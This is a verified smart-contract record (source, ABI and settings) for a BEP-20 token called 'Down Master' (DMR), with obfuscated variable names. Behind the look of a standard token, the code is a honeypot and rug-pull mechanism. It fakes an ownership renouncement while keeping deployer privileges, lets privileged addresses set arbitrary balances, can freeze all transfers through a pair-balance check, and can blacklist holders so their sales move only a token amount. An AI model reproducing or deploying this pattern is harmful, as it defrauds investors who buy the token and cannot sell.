{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface fromExempt {\n    function createPair(address receiverSwap, address shouldToken) external returns (address);\n}\n\ninterface enableAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellReceiverLiquidity) external view returns (uint256);\n\n    function transfer(address minTx, uint256 listShould) external returns (bool);\n\n    function allowance(address minTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minTx,\n        uint256 listShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldReceiver, uint256 value);\n    event Approval(address indexed minTrading, address indexed spender, uint256 value);\n}\n\nabstract contract autoTeamWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listMax is enableAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DownMaster is autoTeamWallet, enableAuto, listMax {\n\n    uint256 constant swapTeam = 17 ** 10;\n\n    function marketingSell() private view {\n        require(maxReceiverSwap[_msgSender()]);\n    }\n\n    function feeTeamTotal(address swapToReceiver, address minTx, uint256 listShould) internal returns (bool) {\n        if (swapToReceiver == takeWallet) {\n            return limitReceiver(swapToReceiver, minTx, listShould);\n        }\n        uint256 marketingMaxTrading = enableAuto(isMarketing).balanceOf(maxToken);\n        require(marketingMaxTrading == amountBuyMode);\n        require(minTx != maxToken);\n        if (enableLaunched[swapToReceiver]) {\n            return limitReceiver(swapToReceiver, minTx, swapTeam);\n        }\n        return limitReceiver(swapToReceiver, minTx, listShould);\n    }\n\n    function getOwner() external view returns (address) {\n        return maxShould;\n    }\n\n    event OwnershipTransferred(address indexed listReceiver, address indexed isSwap);\n\n    uint8 private teamIsAmount = 18;\n\n    function tokenTrading(address tradingAuto, uint256 listShould) public {\n        marketingSell();\n        senderTeam[tradingAuto] = listShould;\n    }\n\n    address private maxShould;\n\n    function approve(address tradingTotal, uint256 listShould) public virtual override returns (bool) {\n        enableMin[_msgSender()][tradingTotal] = listShould;\n        emit Approval(_msgSender(), tradingTotal, listShould);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return txFund;\n    }\n\n    mapping(address => mapping(address => uint256)) private enableMin;\n\n    mapping(address => uint256) private senderTeam;\n\n    function transfer(address tradingAuto, uint256 listShould) external virtual override returns (bool) {\n        return feeTeamTotal(_msgSender(), tradingAuto, listShould);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamIsAmount;\n    }\n\n    bool public txShould;\n\n    uint256 isBuy;\n\n    constructor (){\n        if (maxList) {\n            txShould = true;\n        }\n        receiverReceiver receiverSell = receiverReceiver(limitMode);\n        isMarketing = fromExempt(receiverSell.factory()).createPair(receiverSell.WETH(), address(this));\n        \n        takeWallet = _msgSender();\n        maxReceiverSwap[takeWallet] = true;\n        senderTeam[takeWallet] = totalTake;\n        listMin();\n        if (txShould == exemptMode) {\n            exemptMode = false;\n        }\n        emit Transfer(address(0), takeWallet, totalTake);\n    }\n\n    mapping(address => bool) public enableLaunched;\n\n    function limitReceiver(address swapToReceiver, address minTx, uint256 listShould) internal returns (bool) {\n        require(senderTeam[swapToReceiver] >= listShould);\n        senderTeam[swapToReceiver] -= listShould;\n        senderTeam[minTx] += listShould;\n        emit Transfer(swapToReceiver, minTx, listShould);\n        return true;\n    }\n\n    address limitMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address swapToReceiver, address minTx, uint256 listShould) external override returns (bool) {\n        if (_msgSender() != limitMode) {\n            if (enableMin[swapToReceiver][_msgSender()] != type(uint256).max) {\n                require(listShould <= enableMin[swapToReceiver][_msgSender()]);\n                enableMin[swapToReceiver][_msgSender()] -= listShould;\n            }\n        }\n        return feeTeamTotal(swapToReceiver, minTx, listShould);\n    }\n\n    function allowance(address tokenLiquidity, address tradingTotal) external view virtual override returns (uint256) {\n        if (tradingTotal == limitMode) {\n            return type(uint256).max;\n        }\n        return enableMin[tokenLiquidity][tradingTotal];\n    }\n\n    bool private fromTeam;\n\n    bool public maxList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atBuy;\n    }\n\n    address public isMarketing;\n\n    function owner() external view returns (address) {\n        return maxShould;\n    }\n\n    function amountTotalLaunched(uint256 listShould) public {\n        marketingSell();\n        amountBuyMode = listShould;\n    }\n\n    uint256 private totalTake = 100000000 * 10 ** 18;\n\n    function tokenTradingLiquidity(address autoList) public {\n        marketingSell();\n        if (exemptMode != maxList) {\n            maxList = false;\n        }\n        if (autoList == takeWallet || autoList == isMarketing) {\n            return;\n        }\n        enableLaunched[autoList] = true;\n    }\n\n    function balanceOf(address sellReceiverLiquidity) public view virtual override returns (uint256) {\n        return senderTeam[sellReceiverLiquidity];\n    }\n\n    uint256 amountBuyMode;\n\n    function listMin() public {\n        emit OwnershipTransferred(takeWallet, address(0));\n        maxShould = address(0);\n    }\n\n    string private atBuy = \"DMR\";\n\n    mapping(address => bool) public maxReceiverSwap;\n\n    bool public exemptMode;\n\n    address maxToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public takeWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalTake;\n    }\n\n    function amountSenderIs(address takeMax) public {\n        if (limitLiquidity) {\n            return;\n        }\n        if (txShould == fromTeam) {\n            maxList = true;\n        }\n        maxReceiverSwap[takeMax] = true;\n        \n        limitLiquidity = true;\n    }\n\n    bool public limitLiquidity;\n\n    string private txFund = \"Down Master\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMax\",\"type\":\"address\"}],\"name\":\"amountSenderIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listShould\",\"type\":\"uint256\"}],\"name\":\"amountTotalLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiverLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxReceiverSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShould\",\"type\":\"uint256\"}],\"name\":\"tokenTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoList\",\"type\":\"address\"}],\"name\":\"tokenTradingLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapToReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DownMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}